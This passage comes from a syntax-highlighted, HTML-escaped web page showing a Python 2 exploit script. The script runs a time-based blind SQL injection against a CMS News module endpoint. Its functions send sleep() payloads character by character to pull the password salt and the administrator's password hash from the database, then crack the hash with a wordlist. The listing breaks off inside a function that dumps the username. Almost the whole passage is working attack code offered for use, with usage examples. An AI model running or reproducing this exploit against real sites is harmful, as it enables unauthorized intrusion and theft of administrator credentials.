&lt;&#x2F;span&gt;&lt;span&gt;parser.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;add_option&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;-c&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;, &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;--crack&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;action&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;store_true&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;dest&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;cracking&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;help&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Crack password with wordlist&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;default&lt;&#x2F;span&gt;&lt;span&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;False&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;options, args = parser.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;parse_args&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;not options.url:
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;print &lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;[+] Specify an url target&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;print &lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;[+] Example usage (no cracking password): exploit.py -u http:&#x2F;&#x2F;target-uri&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;print &lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;[+] Example usage (with cracking password): exploit.py -u http:&#x2F;&#x2F;target-uri --crack -w &#x2F;path-wordlist&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;print &lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;[+] Setup the variable TIME with an appropriate time, because this sql injection is a time based.&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;exit&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;url_vuln = options.url + &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&#x2F;moduleinterface.php?mact=News,m1_,default,0&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;
&lt;&#x2F;span&gt;&lt;span&gt;session = requests.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Session&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;dictionary = &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM@._-$&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;
&lt;&#x2F;span&gt;&lt;span&gt;flag = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;True
&lt;&#x2F;span&gt;&lt;span&gt;password = &amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;temp_password = &amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;TIME &lt;&#x2F;span&gt;&lt;span&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;5
&lt;&#x2F;span&gt;&lt;span&gt;db_name = &amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;output = &amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;email = &amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;salt = &amp;#39;&amp;#39;
&lt;&#x2F;span&gt;&lt;span&gt;wordlist = &amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;options.wordlist:
&lt;&#x2F;span&gt;&lt;span&gt;    wordlist += options.wordlist
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;crack_password&lt;&#x2F;span&gt;&lt;span&gt;():
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;global &lt;&#x2F;span&gt;&lt;span&gt;password
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;global &lt;&#x2F;span&gt;&lt;span&gt;output
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;global &lt;&#x2F;span&gt;&lt;span&gt;wordlist
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;global &lt;&#x2F;span&gt;&lt;span&gt;salt
&lt;&#x2F;span&gt;&lt;span&gt;    dict = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;open&lt;&#x2F;span&gt;&lt;span&gt;(wordlist)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;line &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;dict.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;readlines&lt;&#x2F;span&gt;&lt;span&gt;():
&lt;&#x2F;span&gt;&lt;span&gt;        line = line.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;replace&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, &amp;quot;&amp;quot;)
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;beautify_print_try&lt;&#x2F;span&gt;&lt;span&gt;(line)
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;hashlib.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;md5&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;str&lt;&#x2F;span&gt;&lt;span&gt;(salt) + line).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;hexdigest&lt;&#x2F;span&gt;&lt;span&gt;() == password:
&lt;&#x2F;span&gt;&lt;span&gt;            output += &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;[+] Password cracked: &lt;&#x2F;span&gt;&lt;span&gt;&amp;quot; + line
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;break
&lt;&#x2F;span&gt;&lt;span&gt;    dict.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;close&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;beautify_print_try&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;value&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;global &lt;&#x2F;span&gt;&lt;span&gt;output
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;print &lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\033&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;c&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;cprint&lt;&#x2F;span&gt;&lt;span&gt;(output,&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;green&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;attrs&lt;&#x2F;span&gt;&lt;span&gt;=[&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;bold&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;])
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;cprint&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;[*] Try: &lt;&#x2F;span&gt;&lt;span&gt;&amp;#39; + value, &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;red&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;attrs&lt;&#x2F;span&gt;&lt;span&gt;=[&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;bold&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;])
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;beautify_print&lt;&#x2F;span&gt;&lt;span&gt;():
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;global &lt;&#x2F;span&gt;&lt;span&gt;output
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;print &lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\033&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;c&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;cprint&lt;&#x2F;span&gt;&lt;span&gt;(output,&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;green&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;attrs&lt;&#x2F;span&gt;&lt;span&gt;=[&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;bold&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;])
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;dump_salt&lt;&#x2F;span&gt;&lt;span&gt;():
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;global &lt;&#x2F;span&gt;&lt;span&gt;flag
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;global &lt;&#x2F;span&gt;&lt;span&gt;salt
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;global &lt;&#x2F;span&gt;&lt;span&gt;output
&lt;&#x2F;span&gt;&lt;span&gt;    ord_salt = &amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;    ord_salt_temp = &amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;while &lt;&#x2F;span&gt;&lt;span&gt;flag:
&lt;&#x2F;span&gt;&lt;span&gt;        flag = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;False
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;range&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;len&lt;&#x2F;span&gt;&lt;span&gt;(dictionary)):
&lt;&#x2F;span&gt;&lt;span&gt;            temp_salt = salt + dictionary[i]
&lt;&#x2F;span&gt;&lt;span&gt;            ord_salt_temp = ord_salt + &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;hex&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;ord&lt;&#x2F;span&gt;&lt;span&gt;(dictionary[i]))[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;:]
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;beautify_print_try&lt;&#x2F;span&gt;&lt;span&gt;(temp_salt)
&lt;&#x2F;span&gt;&lt;span&gt;            payload = &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;a,b,1,5))+and+(select+sleep(&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot; + &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;str&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;TIME&lt;&#x2F;span&gt;&lt;span&gt;) + &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;)+from+cms_siteprefs+where+sitepref_value+like+0x&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot; + ord_salt_temp + &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;25+and+sitepref_name+like+0x736974656d61736b)+--+&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;            url = url_vuln + &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;amp;m1_idlist=&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot; + payload
&lt;&#x2F;span&gt;&lt;span&gt;            start_time = time.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;time&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;            r = session.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;get&lt;&#x2F;span&gt;&lt;span&gt;(url)
&lt;&#x2F;span&gt;&lt;span&gt;            elapsed_time = time.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;time&lt;&#x2F;span&gt;&lt;span&gt;() - start_time
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;elapsed_time &amp;gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;TIME&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;                flag = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;True
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;break
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;flag:
&lt;&#x2F;span&gt;&lt;span&gt;            salt = temp_salt
&lt;&#x2F;span&gt;&lt;span&gt;            ord_salt = ord_salt_temp
&lt;&#x2F;span&gt;&lt;span&gt;    flag = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;True
&lt;&#x2F;span&gt;&lt;span&gt;    output += &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;[+] Salt for password found: &lt;&#x2F;span&gt;&lt;span&gt;&amp;#39; + salt
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;dump_password&lt;&#x2F;span&gt;&lt;span&gt;():
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;global &lt;&#x2F;span&gt;&lt;span&gt;flag
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;global &lt;&#x2F;span&gt;&lt;span&gt;password
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;global &lt;&#x2F;span&gt;&lt;span&gt;output
&lt;&#x2F;span&gt;&lt;span&gt;    ord_password = &amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;    ord_password_temp = &amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;while &lt;&#x2F;span&gt;&lt;span&gt;flag:
&lt;&#x2F;span&gt;&lt;span&gt;        flag = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;False
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;range&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;len&lt;&#x2F;span&gt;&lt;span&gt;(dictionary)):
&lt;&#x2F;span&gt;&lt;span&gt;            temp_password = password + dictionary[i]
&lt;&#x2F;span&gt;&lt;span&gt;            ord_password_temp = ord_password + &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;hex&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;ord&lt;&#x2F;span&gt;&lt;span&gt;(dictionary[i]))[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;:]
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;beautify_print_try&lt;&#x2F;span&gt;&lt;span&gt;(temp_password)
&lt;&#x2F;span&gt;&lt;span&gt;            payload = &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;a,b,1,5))+and+(select+sleep(&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot; + &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;str&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;TIME&lt;&#x2F;span&gt;&lt;span&gt;) + &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;)+from+cms_users&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;            payload += &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;+where+password+like+0x&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot; + ord_password_temp + &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;25+and+user_id+like+0x31)+--+&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;            url = url_vuln + &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;amp;m1_idlist=&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot; + payload
&lt;&#x2F;span&gt;&lt;span&gt;            start_time = time.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;time&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;            r = session.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;get&lt;&#x2F;span&gt;&lt;span&gt;(url)
&lt;&#x2F;span&gt;&lt;span&gt;            elapsed_time = time.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;time&lt;&#x2F;span&gt;&lt;span&gt;() - start_time
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;elapsed_time &amp;gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;TIME&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;                flag = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;True
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;break
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;flag:
&lt;&#x2F;span&gt;&lt;span&gt;            password = temp_password
&lt;&#x2F;span&gt;&lt;span&gt;            ord_password = ord_password_temp
&lt;&#x2F;span&gt;&lt;span&gt;    flag = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;True
&lt;&#x2F;span&gt;&lt;span&gt;    output += &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;[+] Password found: &lt;&#x2F;span&gt;&lt;span&gt;&amp;#39; + password
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;dump_username&lt;&#x2F;span&gt;&lt;span&gt;():
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;global &lt;&#x2F;span&gt;&lt;span&gt;flag
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;global &lt;&#x2F;span&gt;&lt;span&gt;db_name
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;global &lt;&#x2F;span&gt;&lt;span&gt;output
&lt;&#x2F;span&gt;&lt;span&gt;    ord_db_name = &amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;    ord_db_name_temp = &amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;while &lt;&#x2F;span&gt;&lt;span&gt;flag:
&lt;&#x2F;span&gt;&lt;span&gt;        flag = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;False
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;range&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;len&lt;&#x2F;span&gt;&lt;span&gt;(dictionary)):
&lt;&#x2F;span&gt;&lt;span&gt;            temp_db_name = db_name + dictionary[i]
&lt;&#x2F;span&gt;&lt;span&gt;            ord_db_name_temp = ord_db_name + &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;hex&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;ord&lt;&#x2F;span&gt;&lt;span&gt;(dictionary[i]))[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;:]
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;beautify_print_try&lt;&#x2F;span&gt;&lt;span&gt;(temp_db_name)
